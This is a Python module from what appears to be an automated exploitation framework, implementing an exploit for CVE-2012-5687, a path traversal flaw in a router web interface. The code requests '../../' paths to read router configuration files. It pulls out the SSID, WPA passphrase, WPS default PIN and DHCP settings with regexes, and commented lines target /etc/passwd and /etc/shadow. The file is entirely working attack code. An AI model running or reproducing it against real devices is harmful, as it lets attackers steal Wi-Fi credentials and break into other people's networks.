# -*- coding: utf-8 -*-

from functools import reduce
import requests
import logging
import re

from nios.core.exploits.CExploitBase import CExploitBase
from nios.core.CNiosCore import CNiosCore
from nios.core.auxiliary import exception
from nios.core.CScheduler import CTask


WPA_VARIANTS = ["WPA", "WPA2", "WPA/WPA2"]

REGEX_LIST = [
    re.compile(r"(dns)\s([^\n]+)", re.I),
    re.compile(r"(ipmask)\s([^\n]+)", re.I),
    re.compile(r"(router)\s([^\n]+)", re.I),
    re.compile(r"(subnet)\s([^\n]+)", re.I),
    re.compile(r"(ipaddress)\s([^\n]+)", re.I),
    re.compile(r"(static_lease)\s([^\ ]+)", re.I),

    re.compile(r"(ignore_broadcast_ssid)=(\d)", re.I),
    re.compile(r"(ssid)=\"([^\"]+)", re.I),

    re.compile(r"(wps_default_pin)=([\d]{8})", re.I),
    re.compile(r"(wps_disable)=(\d)", re.I),
    re.compile(r"(wps_upnp_disable)=(\d)", re.I),

    re.compile(r"(wpa_passphrase)=\"([^\"]+)", re.I),
    re.compile(r"(wpa_key_mgmt)=([^\n]+)", re.I),
    re.compile(r"(wpa_pairwise)=([^\n]+)", re.I),
    re.compile(r"(wpa)=(\d)", re.I),
]

KEY_NAMES = [
    ("static_lease", "bssid")
]


class CVE_2012_5687(CExploitBase):

    mCve = 'CVE-2012-5687'

    def __init__(self, core: CNiosCore):
        self.mCore = core

    def __call__(self, host, port):
        url = f"http://{host}:{port}"

        files = [
            f"{url}/help/../../tmp/topology.conf",
            f"{url}/help/../../tmp/wr841n/udhcpd.conf",
            f"{url}/help/../../tmp/ath0.ap_bss",
            # f"{url}/help/../../tmp/80211g.ap_radio",
            # f"{url}/help/../../tmp/hostapd.eap_user",
            # f"{url}/help/../../etc/passwd",
            # f"{url}/help/../../etc/shadow",
        ]

        responces = map(lambda file: self.executeRequest(file), files)

        responces = filter(lambda item: item is not None, responces)

        items = map(lambda responce: self.parseByRegex(responce.content), responces)

        data = reduce(lambda accumulator, dx: {**accumulator, **dx}, items)

        data = self.dataPostProccess(data)
        return {self.mCve: data}

    def executeRequest(self, url):
        httpTimeout = self.mCore.mConfig.get("timeout.http", 2)
        try:
            return requests.get(url, timeout=httpTimeout)
        except Exception:
            return None

    @staticmethod
    def parseByRegex(content):
        data = {}
        for regex in REGEX_LIST:
            result = regex.search(content.decode())
            if not result:
                continue

            (key, value) = result.group(1), result.group(2)

            data.update({key: value})

        return data

    @staticmethod
    def dataPostProccess(data: dict) -> dict:
        for old, new in KEY_NAMES:
            if old in data:
                data[new] = data.pop(old)

        if "wpa" in data:
            data["wpa"] = WPA_VARIANTS[int(data["wpa"]) - 1]

        return data